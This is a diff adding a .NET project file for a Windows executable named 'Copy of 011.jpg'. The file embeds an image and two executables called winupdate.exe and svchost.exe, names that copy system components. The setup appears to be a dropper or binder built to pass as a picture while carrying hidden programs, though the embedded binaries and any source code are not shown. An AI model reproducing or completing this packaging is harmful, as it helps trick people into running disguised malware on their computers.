@@ -1,0 +1,25 @@
+<Project Sdk="Microsoft.NET.Sdk">
+  <PropertyGroup>
+    <AssemblyName>Copy of 011.jpg</AssemblyName>
+    <GenerateAssemblyInfo>False</GenerateAssemblyInfo>
+    <OutputType>WinExe</OutputType>
+    <TargetFramework>net20</TargetFramework>
+  </PropertyGroup>
+  <PropertyGroup>
+    <LangVersion>Preview</LangVersion>
+    <AllowUnsafeBlocks>True</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>app.ico</ApplicationIcon>
+    <RootNamespace />
+  </PropertyGroup>
+  <ItemGroup>
+    <None Remove="Copy-of-011.jpg" />
+    <None Remove="winupdate.exe" />
+    <None Remove="svchost.exe" />
+    <EmbeddedResource Include="Copy-of-011.jpg" />
+    <EmbeddedResource Include="winupdate.exe" />
+    <EmbeddedResource Include="svchost.exe" />
+  </ItemGroup>
+  <ItemGroup />
+</Project>
